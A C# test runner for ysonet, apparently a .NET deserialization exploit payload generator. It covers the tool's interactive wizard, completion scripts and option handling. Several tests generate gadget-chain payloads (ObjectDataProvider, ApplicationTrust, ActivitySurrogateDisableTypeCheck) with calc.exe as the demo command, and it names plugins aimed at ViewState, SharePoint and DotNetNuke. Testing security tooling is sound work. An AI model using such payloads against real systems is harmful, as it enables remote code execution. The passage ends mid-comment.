using System;
using System.Collections.Generic;
using System.IO;
using System.Text;
using NDesk.Options;
using ysonet.Generators;
using ysonet.Helpers;
using ysonet.Helpers.Core;
using ysonet.Interactive;
using ysonet.Plugins;

namespace ysonet.Tests
{
    // Self-contained test runner. No external test framework, so there is no new
    // NuGet dependency (the dependency freshness policy stays satisfied). Each
    // Check reports pass/fail; the process exits non-zero if anything failed.
    internal class Tests
    {
        private static int _passed = 0;
        private static int _failed = 0;

        private static int Main(string[] args)
        {
            if (Environment.GetEnvironmentVariable("YSONET_DUMPUI") != null) { DumpUi(); return 0; }
            Run("Picker.Filter ranks exact, prefix, contains", PickerFilterRanking);
            Run("Picker.Filter empty query returns all", PickerFilterEmpty);
            Run("Picker.Filter no match returns empty", PickerFilterNoMatch);
            Run("OptionField introspects a gadget OptionSet", OptionFieldIntrospection);
            Run("OptionField flag vs value ToArgv", OptionFieldToArgv);
            Run("CommandEcho quotes and builds", CommandEchoBuild);
            Run("CommandEcho gadget tokens shape", CommandEchoGadgetTokens);
            Run("PayloadRunner.Encode base64/hex", EncodeFormats);
            Run("PayloadRunner.GenerateGadget is deterministic", GenerateDeterministic);
            Run("Plugin argv rebuild matches CLI output", PluginArgvRebuild);
            Run("Every global option is surfaced or excluded", OptionCompleteness);
            Run("CliListing lists gadgets, plugins, formatters, options", CliListingBasics);
            Run("CliListing narrows to a gadget's formatters and options", CliListingPerModule);
            Run("PowerShell completion script covers every CLI option", CompletionScriptCoversOptions);
            Run("PowerShell completion script value lists match the tool", CompletionScriptValueLists);
            Run("Completion script is embedded in the exe", CompletionScriptEmbedded);
            Run("Completion profile block installs idempotently and uninstalls", CompletionProfileBlock);
            Run("Completion shell classifier recognizes shells", CompletionShellClassifier);
            Run("Completion policy classifier flags signing-required policies", CompletionPolicyClassifier);
            Run("Menu navigates with arrows and Enter", MenuNavigation);
            Run("Menu digit shortcut and Escape cancel", MenuDigitAndCancel);
            Run("Picker selects by typing and cancels on Esc", PickerShowSelectAndCancel);
            Run("Menu redraws in place in a real console", MenuRedrawsInPlace);
            Run("Menu shows numbers and a key hint", MenuShowsNumbersAndHint);
            Run("Wizard e2e builds the same payload as the core", WizardEndToEnd);
            Run("Wizard advanced options reach the payload", WizardAdvancedOptions);
            Run("Wizard writes to a file, not stdout", WizardOutputToFile);
            Run("Wizard cancel at the picker emits nothing", WizardCancelAtPicker);
            Run("Esc at a text prompt goes back, no payload", WizardEscAtTextPrompt);
            Run("Wizard plugin path matches the core", WizardPluginPath);
            Run("Gadgets declare their command-input type", CommandInputTypes);
            Run("Ignored-command gadget needs no -c and hides those fields", IgnoredCommandGadget);
            Run("Gadgets declare their variants", GadgetsDeclareVariants);
            Run("Variants can declare their own command-input type", VariantInputTypes);
            Run("Option heuristics recover choices/default/required", OptionHeuristics);
            Run("Editor builds plugin fields with defaults and a gadget picker", EditorPluginFields);
            Run("Editor exposes actions and marks module-own options", EditorActionsAndOwnership);
            Run("Choice options are detected (modes, colon lists, numbered)", ChoiceDetection);
            Run("Bridged-chain setting offers bridge gadgets", BridgedChainChoices);
            Run("Switching variant resets a stale, wrong-type command", VariantSwitchResetsCommand);
            Run("Changed settings persist across modules; reset restores defaults", OptionsPersistAndReset);
            Run("A typed command persists across gadget switches (not only on generate)", CommandPersistsAcrossGadgets);
            Run("Shared settings carry from a gadget to a plugin", SettingsSharedGadgetToPlugin);
            Run("Themes apply and are named", ThemeApply);
            Run("Conditional plugin options are not marked required", ConditionalRequired);
            Run("ViewState missing-payload error names the options to set", ViewStateModeErrorIsActionable);
            Run("Informational plugin options (examples) are hidden from the editor", ExamplesHiddenFromEditor);
            Run("Plugin modes drive which settings show, are required, and are passed", PluginModesDriveOptions);
            Run("DotNetNuke modes select the payload mode and pass the right args", DotNetNukeModes);
            Run("Clipboard modes scope format vs xamlvariant per mode", ClipboardModes);
            Run("SharePoint modes select the CVE and scope its inner setting", SharePointModes);
            Run("A space sets an explicit empty string, distinct from unset", ExplicitEmptyStringViaSpace);
            Run("Interactive banner marks beta and shows the version", BannerShowsBetaAndVersion);
            Run("Show-command action prints the one-liner without generating", WizardShowCommand);
            Run("Generate and quit emits the payload and exits", WizardGenerateAndQuit);
            Run("Columns render in a virtual terminal (layout + per-cell highlight)", ColumnsRenderInVirtualTerminal);
            Run("Typing filters the module list by substring", ColumnFilterNarrowsModules);
            Run("Typing filters the settings list by substring", ColumnFilterNarrowsSettings);
            Run("Module info panel shows facts while choosing a module", ModuleInfoPanelShowsFacts);
            Run("FilterFields keeps substring matches and keeps order", FilterFieldsUnit);
            Run("Help/description text is shown sentence-cased", SentenceCasingUnit);
            Run("Every top menu screen renders in a virtual terminal", AllMenusRender);
            Run("Text editor pre-fills and appends on type (no wipe)", TextEditAppends);
            Run("Text editor caret moves and edits in place (Left/Home/Delete)", TextEditCaretEditing);
            Run("Text editor word ops (Ctrl+Backspace, Ctrl+Left)", TextEditWordOps);
            Run("Text editor wraps a long value in place across rows", TextEditWrapsInPlace);
            Run("A focused setting's full value shows in the footer for copying", FocusedValueInFooter);
            Run("LineEditBuffer inserts, deletes words, clears, and clamps the caret", LineEditBufferUnit);
            Run("Generate is blocked (not an exit) when required settings are empty", WizardBlocksMissingRequired);
            Run("Blocked report enumerates every missing required setting", BlockedReportEnumeratesMissing);
            Run("Blocked report shows the command's expected input and example", BlockedReportShowsCommandExample);
            Run("Home/End jump to first/last setting in the columns", ColumnsHomeEndNav);
            Run("Picker Home/End jump to first/last match", PickerHomeEnd);
            Run("Wizard remembers the last command", WizardRemembersLastCommand);
            Run("Run-all-formatters survives file/url gadgets", WizardRunAllFormatters);
            Run("Run-all-formatters saves payloads to a folder", WizardRunAllFormattersToFolder);
            Run("Clipboard plugin exposes the wpfxaml mode options", ClipboardWpfXamlOptions);
            Run("Clipboard payloads actually trigger (winforms + wpfxaml variants)", ClipboardPayloadsTrigger);
            Run("Restrictive XAML load blocks the ObjectDataProvider gadget", RestrictiveXamlBlocksGadget);
            Run("Option help renders without hanging for every plugin and gadget", OptionHelpNeverHangs);
            Run("SoftBreak wraps over-long help tokens (NDesk hang guard)", SoftBreakWrapsLongTokens);
            Run("Every gadget generates a non-empty payload from valid inputs", EveryGadgetGeneratesAPayload);
            Run("Every safe plugin generates a payload; the rest are explicitly excluded", EverySafePluginGeneratesAPayload);

            Console.Error.WriteLine();
            Console.Error.WriteLine("Passed: " + _passed + "  Failed: " + _failed);
            return _failed == 0 ? 0 : 1;
        }

        // ---- individual tests --------------------------------------------------

        private static void PickerFilterRanking()
        {
            var items = new List<string> { "Beta", "AlphaBeta", "Alpha" };
            var r = Picker.Filter(items, "alpha");
            AssertEqual(2, r.Count, "count");
            AssertEqual("Alpha", r[0], "exact first");
            AssertEqual("AlphaBeta", r[1], "prefix/contains second");
        }

        private static void PickerFilterEmpty()
        {
            var items = new List<string> { "a", "b", "c" };
            var r = Picker.Filter(items, "");
            AssertEqual(3, r.Count, "returns all");
        }

        private static void PickerFilterNoMatch()
        {
            var items = new List<string> { "a", "b" };
            var r = Picker.Filter(items, "zzz");
            AssertEqual(0, r.Count, "no match");
        }

        private static void OptionFieldIntrospection()
        {
            IGenerator g = GadgetHelper.CreateGadgetInstance("ObjectDataProvider");
            AssertTrue(g != null, "gadget loads");
            var fields = OptionField.FromOptionSet(g.Options());
            // ObjectDataProvider has var|variant= and xamlurl=
            AssertEqual(2, fields.Count, "two options");
            OptionField variant = FindField(fields, "variant");
            OptionField xamlurl = FindField(fields, "xamlurl");
            AssertTrue(variant != null, "variant field present");
            AssertTrue(xamlurl != null, "xamlurl field present");
            AssertTrue(variant.TakesValue, "variant takes a value");
            // var|variant has no single-char alias, so ShortName is null.
            AssertTrue(variant.ShortName == null, "variant has no single-char short name");
            AssertTrue(!string.IsNullOrEmpty(variant.Description), "variant has help text");

            // A single-char alias is captured as ShortName.
            OptionSet withShort = new OptionSet { { "p|plugin=", "the plugin", v => { } } };
            OptionField pf = FindField(OptionField.FromOptionSet(withShort), "plugin");
            AssertEqual("p", pf.ShortName, "single-char short name captured");
        }

        private static void OptionFieldToArgv()
        {
            bool flag = false;
            string val = null;
            OptionSet set = new OptionSet
            {
                { "minify", "a flag", v => flag = v != null },
                { "var|variant=", "a value", v => val = v }
            };
            var fields = OptionField.FromOptionSet(set);

            OptionField f = FindField(fields, "minify");
            OptionField v2 = FindField(fields, "variant");

            AssertTrue(f.IsFlag, "minify is a flag");
            AssertEqual(0, f.ToArgv().Count, "unset flag emits nothing");
            f.Value = "true";
            var flagArgv = f.ToArgv();
            AssertEqual(1, flagArgv.Count, "set flag emits one token");
            AssertEqual("--minify", flagArgv[0], "flag token");

            AssertEqual(0, v2.ToArgv().Count, "unset value emits nothing");
            v2.Value = "2";
            var valArgv = v2.ToArgv();
            AssertEqual(2, valArgv.Count, "set value emits two tokens");
            AssertEqual("--variant", valArgv[0], "value flag");
            AssertEqual("2", valArgv[1], "value");
        }

        private static void CommandEchoBuild()
        {
            AssertEqual("plain", CommandEcho.Quote("plain"), "no quote needed");
            AssertEqual("\"a b\"", CommandEcho.Quote("a b"), "space quoted");
            AssertEqual("\"\"", CommandEcho.Quote(""), "empty quoted");
            var tokens = new List<string> { "-g", "ObjectDataProvider", "-c", "a b" };
            string line = CommandEcho.Build(tokens);
            AssertEqual("ysonet.exe -g ObjectDataProvider -c \"a b\"", line, "built line");
        }

        private static void CommandEchoGadgetTokens()
        {
            var tokens = CommandEcho.GadgetTokens(
                "ObjectDataProvider", "Json.NET", "calc.exe",
                false, false, "", "", "", false, false, false, false, null);
            string line = CommandEcho.Build(tokens);
            AssertTrue(line.StartsWith("ysonet.exe -g ObjectDataProvider -f Json.NET -c calc.exe"),
                "gadget command shape: " + line);
        }

        private static void EncodeFormats()
        {
            int len;
            byte[] b64 = PayloadRunner.Encode("abc", "base64", out len);
            AssertEqual("YWJj", Encoding.ASCII.GetString(b64), "base64 of abc");

            byte[] hex = PayloadRunner.Encode(new byte[] { 0x01, 0xff }, "hex", out len);
            AssertEqual("01FF", Encoding.ASCII.GetString(hex), "hex of bytes");

            byte[] raw = PayloadRunner.Encode("hello", "raw", out len);
            AssertEqual("hello", Encoding.UTF8.GetString(raw), "raw string");
        }

        private static void GenerateDeterministic()
        {
            byte[] a = GenerateOdpJson("calc.exe");
            byte[] b = GenerateOdpJson("calc.exe");
            AssertTrue(a != null && a.Length > 0, "payload produced");
            AssertTrue(BytesEqual(a, b), "same inputs give same bytes");
        }

        private static void PluginArgvRebuild()
        {
            // Rebuild argv the way the wizard does and confirm the plugin runs.
            var argv = new List<string> { "-p", "ApplicationTrust", "-c", "calc.exe" };
            RunResult r = PayloadRunner.RunPlugin("ApplicationTrust", argv.ToArray());
            AssertTrue(r.Success, "plugin ran: " + r.ErrorMessage);
            AssertTrue(r.Raw != null, "plugin produced output");
        }

        private static void OptionCompleteness()
        {
            var fields = OptionField.FromOptionSet(ysonet.Program.options);
            AssertTrue(fields.Count > 0, "global options readable");

            var covered = new HashSet<string>(StringComparer.OrdinalIgnoreCase);
            foreach (string s in Wizard.SurfacedGlobalOptions) covered.Add(s);
            foreach (string s in Wizard.NonPayloadGlobalOptions) covered.Add(s);

            foreach (OptionField f in fields)
            {
                AssertTrue(covered.Contains(f.Name),
                    "global option '" + f.Name + "' must be surfaced or explicitly excluded");
            }
        }

        private static void CliListingBasics()
        {
            var gadgets = CliListing.Gadgets();
            var plugins = CliListing.Plugins();
            var formatters = CliListing.Formatters();
            var options = CliListing.OptionTokens(ysonet.Program.options);

            AssertTrue(gadgets.Count > 10, "several gadgets listed");
            AssertTrue(plugins.Count > 5, "several plugins listed");
            AssertTrue(formatters.Count > 5, "several formatters listed");
            AssertTrue(options.Count > 10, "several option tokens listed");

            // "Generic" is an internal placeholder and must never be offered.
            AssertTrue(!gadgets.Contains("Generic"), "gadgets exclude Generic");
            AssertTrue(!plugins.Contains("Generic"), "plugins exclude Generic");

            // A few well-known values must be present.
            AssertTrue(gadgets.Contains("ObjectDataProvider"), "ObjectDataProvider listed");
            AssertTrue(formatters.Contains("BinaryFormatter"), "BinaryFormatter listed");
            AssertTrue(formatters.Contains("Json.NET"), "Json.NET listed (dot kept)");
            // Variant annotations must be cleaned off in the global formatter list.
            AssertTrue(!formatters.Contains("Xaml (4)"), "no annotated formatter names");
            AssertTrue(formatters.Contains("Xaml"), "Xaml listed cleanly");

            AssertTrue(options.Contains("-g") && options.Contains("--gadget"), "gadget option tokens present");
            AssertTrue(options.Contains("--list"), "list option token present");
        }

        private static void CliListingPerModule()
        {
            var odpFormatters = CliListing.GadgetFormatters("ObjectDataProvider");
            AssertTrue(odpFormatters.Count > 3, "gadget reports its formatters");
            AssertTrue(odpFormatters.Contains("Json.NET"), "ObjectDataProvider supports Json.NET");

            var odpOptions = CliListing.GadgetOptions("ObjectDataProvider");
            AssertTrue(odpOptions.Contains("--variant"), "ObjectDataProvider exposes --variant");
            AssertTrue(odpOptions.Contains("--xamlurl"), "ObjectDataProvider exposes --xamlurl");

            var vsOptions = CliListing.PluginOptions("ViewState");
            AssertTrue(vsOptions.Count > 5, "ViewState plugin exposes options");
            AssertTrue(vsOptions.Contains("-g") || vsOptions.Contains("--gadget"), "ViewState exposes a gadget option");

            // Unknown names return empty, not an exception.
            AssertEqual(0, CliListing.GadgetFormatters("NoSuchGadget").Count, "unknown gadget -> empty");
            AssertEqual(0, CliListing.PluginOptions("NoSuchPlugin").Count, "unknown plugin -> empty");
        }

        // Drift guard: every top-level CLI option the tool defines must be known
        // to the PowerShell completion script, so adding an option to Program.cs
        // without updating the script fails the build.
        private static void CompletionScriptCoversOptions()
        {
            string script = ReadCompletionScript();

            // Dev-only options intentionally left out of completion.
            var omitted = new HashSet<string>(StringComparer.Ordinal) { "--runmytest" };

            foreach (string token in CliListing.OptionTokens(ysonet.Program.options))
            {
                if (omitted.Contains(token))
                    continue;
                // The script lists tokens as quoted literals, e.g. '--gadget'.
                AssertTrue(script.Contains("'" + token + "'"),
                    "completion script must know option '" + token + "' (add it to tools/completions/ysonet.ps1)");
            }
        }

        // Drift guard: the script must read its value lists live from `--list`
        // (not hardcode them), and its --list category set must match the tool.
        private static void CompletionScriptValueLists()
        {
            string script = ReadCompletionScript();

            AssertTrue(script.Contains("--list"), "script drives value lists via --list");

            foreach (string category in CliListing.ListCategories)
            {
                AssertTrue(script.Contains("'" + category + "'"),
                    "script must reference --list category '" + category + "'");
            }
        }

        private static void CompletionScriptEmbedded()
        {
            string s = CompletionCommand.LoadPowerShellScript();
            AssertTrue(!string.IsNullOrEmpty(s), "embedded completion script present");
            AssertTrue(s.Contains("Register-ArgumentCompleter"), "script registers a completer");
            AssertTrue(s.Contains("--list"), "embedded script drives values via --list");
        }

        private static void CompletionProfileBlock()
        {
            string exe = @"C:\tools\ysonet.exe";

            // Insert into an empty profile.
            string t0 = CompletionCommand.AddOrUpdateBlock("", exe);
            AssertTrue(t0.Contains("$env:YSONET_EXE = 'C:\\tools\\ysonet.exe'"), "block sets exe path");
            AssertTrue(t0.Contains("completion powershell"), "block loads the script");

            // Installing again with the same exe is a no-op.
            string t1 = CompletionCommand.AddOrUpdateBlock(t0, exe);
            AssertEqual(t0, t1, "install is idempotent");

            // A different exe path replaces in place, leaving a single block.
            string t2 = CompletionCommand.AddOrUpdateBlock(t0, @"D:\ysonet.exe");
            AssertEqual(1, CountOccurrences(t2, "YSONET_EXE"), "only one managed block after update");
            AssertTrue(t2.Contains(@"D:\ysonet.exe"), "block refreshed to new exe path");

            // Surrounding profile content survives install and uninstall.
            string user = "Set-Alias ll Get-ChildItem" + Environment.NewLine;
            string withBlock = CompletionCommand.AddOrUpdateBlock(user, exe);
            AssertTrue(withBlock.Contains("Set-Alias ll Get-ChildItem"), "user content kept on install");

            string removed = CompletionCommand.RemoveBlock(withBlock);
            AssertTrue(removed.Contains("Set-Alias ll Get-ChildItem"), "user content kept on uninstall");
            AssertTrue(!removed.Contains("YSONET_EXE"), "managed block gone after uninstall");

            // When our block is the whole profile, removal leaves nothing, so
            // uninstall deletes the file instead of leaving an empty one.
            AssertTrue(string.IsNullOrWhiteSpace(CompletionCommand.RemoveBlock(t0)),
                "block-only profile becomes empty on uninstall");
        }

        private static void CompletionPolicyClassifier()
        {
            AssertTrue(CompletionCommand.PolicyBlocksUnsignedProfile("AllSigned"), "AllSigned blocks");
            AssertTrue(CompletionCommand.PolicyBlocksUnsignedProfile("Restricted"), "Restricted blocks");
            AssertTrue(CompletionCommand.PolicyBlocksUnsignedProfile(" allsigned "), "case/space insensitive");
            AssertTrue(!CompletionCommand.PolicyBlocksUnsignedProfile("RemoteSigned"), "RemoteSigned allows");
            AssertTrue(!CompletionCommand.PolicyBlocksUnsignedProfile("Bypass"), "Bypass allows");
            AssertTrue(!CompletionCommand.PolicyBlocksUnsignedProfile("Unrestricted"), "Unrestricted allows");
            AssertTrue(!CompletionCommand.PolicyBlocksUnsignedProfile(""), "empty is not a block");
        }

        private static void CompletionShellClassifier()
        {
            AssertEqual(CompletionCommand.ShellKind.PowerShellCore, CompletionCommand.ClassifyShell("pwsh"), "pwsh");
            AssertEqual(CompletionCommand.ShellKind.PowerShellCore, CompletionCommand.ClassifyShell("pwsh.exe"), "pwsh.exe");
            AssertEqual(CompletionCommand.ShellKind.WindowsPowerShell, CompletionCommand.ClassifyShell("powershell"), "powershell");
            AssertEqual(CompletionCommand.ShellKind.Cmd, CompletionCommand.ClassifyShell("cmd"), "cmd");
            AssertEqual(CompletionCommand.ShellKind.Posix, CompletionCommand.ClassifyShell("bash"), "bash");
            AssertEqual(CompletionCommand.ShellKind.Unknown, CompletionCommand.ClassifyShell("notepad"), "unknown app");
        }

        private static int CountOccurrences(string haystack, string needle)
        {
            int count = 0, i = 0;
            while ((i = haystack.IndexOf(needle, i, StringComparison.Ordinal)) >= 0)
            {
                count++;
                i += needle.Length;
            }
            return count;
        }

        // Locate tools/completions/ysonet.ps1 by walking up from the test binary,
        // so no absolute/machine path is baked in.
        private static string ReadCompletionScript()
        {
            string rel = Path.Combine("tools", "completions", "ysonet.ps1");
            var dir = new DirectoryInfo(AppDomain.CurrentDomain.BaseDirectory);
            while (dir != null)
            {
                string candidate = Path.Combine(dir.FullName, rel);
                if (File.Exists(candidate))
                    return File.ReadAllText(candidate);
                dir = dir.Parent;
            }
            throw new Exception("could not locate " + rel + " above " + AppDomain.CurrentDomain.BaseDirectory);
        }

        private static void WizardEndToEnd()
        {
            // Drive the editor to build ObjectDataProvider + Json.NET + calc.exe.
            // The command defaults to calc.exe, so only the formatter is changed,
            // then Generate. Compare to the core-generated bytes.
            var keys = new ScriptedKeyReader();
            keys.Enter();                            // top menu -> gadget payload (index 0)
            keys.Type("ObjectDataProvider").Enter(); // module picker: filter + pick
            keys.Type("formatter").Enter();          // form: open the formatter setting
            keys.Digit(2);                           // choice menu -> Json.NET (index 1)
            keys.Type("Generate").Enter();           // form: run Generate
            keys.Escape();                           // leave the settings form
            keys.Escape();                           // leave the module list
            keys.Escape();                           // top menu -> quit

            string stderr;
            byte[] got = DriveWizard(keys, out stderr);
            byte[] expected = GenerateOdpJson("calc.exe");

            AssertTrue(got.Length > 0, "wizard wrote a payload to stdout stream");
            AssertTrue(BytesEqual(got, expected), "wizard payload equals core payload");
            AssertTrue(stderr.Contains("ysonet.exe -g ObjectDataProvider -f Json.NET -c calc.exe"),
                "equivalent command echoed to stderr");
            AssertTrue(!Encoding.UTF8.GetString(got).Contains("Equivalent command"),
                "prompts did not leak into the payload stream");
        }

        private static void MenuNavigation()
        {
            var keys = new ScriptedKeyReader();
            keys.Down().Down().Enter();   // 0 -> 1 -> 2, select index 2
            Menu m = new Menu(keys);
            int i = WithSwallowedError(() => m.Show("pick", new List<string> { "a", "b", "c" }, 0));
            AssertEqual(2, i, "arrows moved to index 2");
        }

        private static void MenuDigitAndCancel()
        {
            Menu m1 = new Menu(new ScriptedKeyReader().Digit(2));
            int i = WithSwallowedError(() => m1.Show("pick", new List<string> { "a", "b", "c" }, 0));
            AssertEqual(1, i, "digit 2 selects index 1");

            Menu m2 = new Menu(new ScriptedKeyReader().Escape());
            int c = WithSwallowedError(() => m2.Show("pick", new List<string> { "a", "b" }, 0));
            AssertEqual(-1, c, "escape cancels with -1");
        }

        private static void PickerShowSelectAndCancel()
        {
            var keys = new ScriptedKeyReader().Type("Beta").Enter();
            Picker p = new Picker(keys);
            string sel = WithSwallowedError(() =>
                p.Show("pick", new List<string> { "Alpha", "Beta", "Gamma" }, null));
            AssertEqual("Beta", sel, "typed filter then Enter selects");

            Picker p2 = new Picker(new ScriptedKeyReader().Escape());
            string cancelled = WithSwallowedError(() =>
                p2.Show("pick", new List<string> { "Alpha", "Beta" }, null));
            AssertTrue(cancelled == null, "escape cancels to null");
        }

        private static void MenuRedrawsInPlace()
        {
            // Only meaningful with a real console cursor. Under a redirected stderr
            // (this test harness, CI) the widget appends by design, so there is
            // nothing to measure - treat as a pass. In a real terminal this asserts
            // that N navigation keys do NOT print N copies of the menu (the bug we
            // fixed: absolute-row caching that broke when the buffer scrolled).
            if (!ysonet.Interactive.ConsoleCursor.CanControl())
                return;

            var items = new List<string> { "a", "b", "c", "d", "e" };
            int before = Console.CursorTop;
            var keys = new ScriptedKeyReader().Down().Down().Down().Enter();
            new Menu(keys).Show("pick", items, 0);
            int after = Console.CursorTop;

            // In-place redraw advances the cursor by about one menu block
            // (title + items), not by block-height per keystroke.
            int advanced = after - before;
            AssertTrue(advanced <= items.Count + 3,
                "cursor advanced by ~one block, not once per keypress (advanced=" + advanced + ")");
        }

        private static void MenuShowsNumbersAndHint()
        {
            var keys = new ScriptedKeyReader().Enter();
            var err = new StringWriter();
            TextWriter saved = Console.Error;
            Console.SetError(err);
            try { new Menu(keys).Show("pick", new List<string> { "Alpha", "Beta", "Gamma" }, 0); }
            finally { Console.SetError(saved); }

            string s = err.ToString();
            AssertTrue(s.Contains("1.") && s.Contains("Alpha"), "menu items are numbered");
            AssertTrue(s.Contains("Esc to go back"), "menu shows the key hint");
        }

        private static void WizardAdvancedOptions()
        {
            var keys = new ScriptedKeyReader();
            keys.Enter();                            // top -> gadget
            keys.Type("ObjectDataProvider").Enter(); // module picker
            keys.Type("formatter").Enter();          // open formatter
            keys.Digit(2);                           // Json.NET
            keys.Type("minify").Enter();             // open the minify flag
            keys.Digit(1);                           // on (index 0)
            keys.Type("Generate").Enter();
            keys.Escape();                           // leave form
            keys.Escape();                           // leave module list
            keys.Escape();                           // quit

            string stderr;
            byte[] got = DriveWizard(keys, out stderr);
            byte[] expected = GenerateOdpJson("calc.exe", true);

            AssertTrue(got.Length > 0, "payload produced");
            AssertTrue(BytesEqual(got, expected), "minified wizard payload equals minified core payload");
            AssertTrue(stderr.Contains("--minify"), "echoed command shows --minify");
        }

        private static void WizardOutputToFile()
        {
            string file = Path.Combine(Path.GetTempPath(), "ysonet_wizard_test_out.bin");
            if (File.Exists(file)) File.Delete(file);

            var keys = new ScriptedKeyReader();
            keys.Enter();                            // top -> gadget
            keys.Type("ObjectDataProvider").Enter(); // module picker
            keys.Type("formatter").Enter();          // open formatter
            keys.Digit(2);                           // Json.NET
            keys.Type("outputpath").Enter();         // open output path
            keys.TypeLine(file);                     // set the file
            keys.Type("Generate").Enter();
            keys.Escape();                           // leave form
            keys.Escape();                           // leave module list
            keys.Escape();                           // quit

            string stderr;
            byte[] stdout = DriveWizard(keys, out stderr);

            AssertEqual(0, stdout.Length, "nothing written to the stdout stream");
            AssertTrue(File.Exists(file), "file was written");
            byte[] fileBytes = File.ReadAllBytes(file);
            AssertTrue(BytesEqual(fileBytes, GenerateOdpJson("calc.exe", false)), "file bytes equal core payload");
            File.Delete(file);
        }

        private static void WizardCancelAtPicker()
        {
            var keys = new ScriptedKeyReader();
            keys.Enter();     // top -> gadget
            keys.Escape();    // cancel the module list -> back to top
            keys.Escape();    // quit

            string stderr;
            byte[] stdout = DriveWizard(keys, out stderr);
            AssertEqual(0, stdout.Length, "cancelling emits no payload");
        }

        private static void WizardEscAtTextPrompt()
        {
            // Open a text setting, press Esc: the edit cancels back to the settings
            // form (not stuck at the prompt), and nothing is generated.
            var keys = new ScriptedKeyReader();
            keys.Enter();                            // top -> gadget
            keys.Type("ObjectDataProvider").Enter(); // module picker
            keys.Type("command").Enter();            // open the command text setting
            keys.Escape();                           // Esc at the prompt -> back to the form
            keys.Escape();                           // leave the form -> module list
            keys.Escape();                           // leave the module list -> top
            keys.Escape();                           // top menu -> quit

            string stderr;
            byte[] stdout = DriveWizard(keys, out stderr);
            AssertEqual(0, stdout.Length, "Esc at a text prompt emits no payload");
        }

        private static void WizardPluginPath()
        {
            var keys = new ScriptedKeyReader();
            keys.Digit(2);                          // top -> plugin (index 1)
            keys.Type("ApplicationTrust").Enter();  // module picker
            keys.Type("command").Enter();           // open the command setting
            keys.TypeLine("calc.exe");              // set it
            keys.Type("Generate").Enter();
            keys.Escape();                          // leave form
            keys.Escape();                          // leave module list
            keys.Escape();                          // quit

            string stderr;
            byte[] got = DriveWizard(keys, out stderr);

            // The editor mirrors the plugin's own default (usesimpletype on), so the
            // core comparison passes the same flag. It does not change the payload
            // here (no minify), but keeps the two argv builds equivalent.
            RunResult core = PayloadRunner.RunPlugin("ApplicationTrust",
                new string[] { "-p", "ApplicationTrust", "--command", "calc.exe", "--usesimpletype" });
            AssertTrue(core.Success, "core plugin ran");
            int len;
            byte[] expected = PayloadRunner.Encode(core.Raw, "raw", out len);

            AssertTrue(got.Length > 0, "plugin payload produced");
            AssertTrue(BytesEqual(got, expected), "wizard plugin payload equals core payload");
            AssertTrue(stderr.Contains("-p ApplicationTrust"), "echoed plugin command");
        }

        private static void CommandInputTypes()
        {
            // Each gadget declares what -c means; the wizard relies on this.
            AssertEqual(CommandInputType.ShellCommand, Gadget("ObjectDataProvider").CommandInput(), "ODP is a shell command");
            AssertEqual(CommandInputType.Ignored, Gadget("ActivitySurrogateSelector").CommandInput(), "ASS ignores the command");
            AssertEqual(CommandInputType.Ignored, Gadget("ActivitySurrogateDisableTypeCheck").CommandInput(), "ASDTC ignores the command");
            AssertEqual(CommandInputType.CsSourceFile, Gadget("ActivitySurrogateSelectorFromFile").CommandInput(), "ASSFromFile takes a .cs file");
            AssertEqual(CommandInputType.CsSourceFile, Gadget("XamlAssemblyLoadFromFile").CommandInput(), "XamlAssemblyLoadFromFile takes a .cs file");
            AssertEqual(CommandInputType.DllPath, Gadget("BaseActivationFactory").CommandInput(), "BaseActivationFactory takes a DLL path");
            AssertEqual(CommandInputType.DllPath, Gadget("GetterCompilerResults").CommandInput(), "GetterCompilerResults takes a DLL path");
            AssertEqual(CommandInputType.Url, Gadget("ObjRef").CommandInput(), "ObjRef takes a URL");
            AssertEqual(CommandInputType.FilePath, Gadget("XamlImageInfo").CommandInput(), "XamlImageInfo takes a file path");

            // Prompt labels follow the type.
            AssertEqual("Command to run", Wizard.CommandLabel(CommandInputType.ShellCommand), "shell label");
            AssertEqual("Path to .dll", Wizard.CommandLabel(CommandInputType.DllPath), "dll label");
            AssertEqual("URL", Wizard.CommandLabel(CommandInputType.Url), "url label");
            AssertEqual("calc.exe", Wizard.CommandDefault(CommandInputType.ShellCommand), "shell default");
            AssertEqual("", Wizard.CommandDefault(CommandInputType.DllPath), "dll has no default");
        }

        private static void IgnoredCommandGadget()
        {
            // ActivitySurrogateDisableTypeCheck ignores -c (it just flips a protection
            // flag). It must generate with no command, and both the CLI and the
            // interactive editor must treat the command as unneeded.
            const string name = "ActivitySurrogateDisableTypeCheck";
            AssertEqual(CommandInputType.Ignored, Gadget(name).CommandInput(), "gadget ignores the command");

            // Interactive: the command and rawcmd fields are hidden, command not required.
            var editor = new ModuleEditor(null, null, true, null, null);
            var fields = editor.BuildFieldsForTest(name);
            EditableField cmd = FindEditable(fields, "command");
            EditableField rawcmd = FindEditable(fields, "rawcmd");
            AssertTrue(cmd != null && cmd.Hidden && !cmd.Required, "command field hidden and optional");
            AssertTrue(rawcmd != null && rawcmd.Hidden, "rawcmd field hidden");

            // The equivalent command line omits -c when there is no command.
            var tokens = CommandEcho.GadgetTokens(name, "LosFormatter", "",
                false, false, "", "", "", false, false, false, false, null);
            AssertTrue(!tokens.Contains("-c"), "no -c token for an ignored command");

            // Core generation succeeds with an empty command.
            InputArgs ia = new InputArgs();
            ia.Cmd = "";
            GenerationRequest req = new GenerationRequest();
            req.GadgetName = name;
            req.FormatterName = "LosFormatter";
            req.OutputFormat = "";
            req.InputArgs = ia;
            RunResult r = PayloadRunner.GenerateGadget(req);
            AssertTrue(r.Success, "generates with no command: " + r.ErrorMessage);
            AssertTrue(r.Raw != null, "produced a payload");
        }

        private static IGenerator Gadget(string name)
        {
            IGenerator g = GadgetHelper.CreateGadgetInstance(name);
            if (g == null)
                throw new Exception("gadget not found: " + name);
            return g;
        }

        private static void GadgetsDeclareVariants()
        {
            AssertEqual(4, Gadget("ObjectDataProvider").Variants().Count, "ODP declares 4 variants");
            AssertEqual(2, Gadget("XamlImageInfo").Variants().Count, "XamlImageInfo declares 2 variants");
            AssertEqual(2, Gadget("ActivitySurrogateSelector").Variants().Count, "ASS declares 2 variants");
            AssertEqual(2, Gadget("ActivitySurrogateSelectorFromFile").Variants().Count, "ASSFromFile inherits 2 variants");
            AssertEqual(2, Gadget("ResourceSet").Variants().Count, "ResourceSet (ig option) declares 2 variants");
            AssertEqual(0, Gadget("TypeConfuseDelegate").Variants().Count, "TypeConfuseDelegate has no variants");

            var v = Gadget("ObjectDataProvider").Variants();
            AssertEqual(1, v[0].Number, "first variant is number 1");
            AssertTrue(!string.IsNullOrEmpty(v[0].Label), "variants carry a label");
        }

        private static void VariantInputTypes()
        {
            // XamlImageInfo is the reference case: its variants take different -c
